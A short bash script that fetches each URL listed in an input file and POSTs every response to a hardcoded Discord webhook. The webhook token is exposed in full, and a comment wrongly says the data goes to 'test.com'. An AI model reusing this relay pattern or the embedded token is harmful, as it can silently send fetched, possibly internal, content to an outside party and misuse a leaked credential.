#!/bin/bash

# Check if a file name is provided as an argument
if [ "$#" -ne 1 ]; then
    echo "Usage: $0 <filename>"
    exit 1
fi

filename="$1"

# Check if the file exists
if [ ! -f "$filename" ]; then
    echo "File not found: $filename"
    exit 1
fi

# Iterate over each line in the file
while IFS= read -r line; do
    response=$(curl -s "$line")
#    echo $response | base64
    if [ "$response" = $'\n' ]; then
        echo "nothing !!!"
    else
        # Convert the response to a JSON object with jq
        # The response is assumed to be a simple string that needs to be JSON encoded
        json_response=$(jq -nc --arg resp "$response" '{"content": $resp}')

        # Send the JSON response to test.com
        curl -X POST -H "Content-Type: application/json" -d "$json_response" https://discord.com/api/webhooks/1216775264588005407/KPWsewc6mEFSPesILV8WFDi8eB6SXC6wZ_Inno-_GJU_jQKzSXdp5NX3HAtIuNzZyUEX
    fi
done < "$filename"
